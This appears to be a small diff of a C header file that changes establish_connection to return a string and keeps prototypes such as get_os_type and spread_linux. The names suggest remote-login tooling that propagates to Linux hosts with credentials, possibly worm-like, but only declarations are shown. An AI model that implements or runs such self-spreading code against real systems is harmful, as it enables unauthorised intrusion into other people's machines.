@@ -39,7 +39,7 @@ enum os_type {
 
 
 enum os_type get_os_type(const char *ip_address);
-int establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
+char* establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
 void spread_linux(const char* host, const char* username, const char* password);
 
 // static void spread_linux(const char* host, const char* username, const char* password, const char* command);
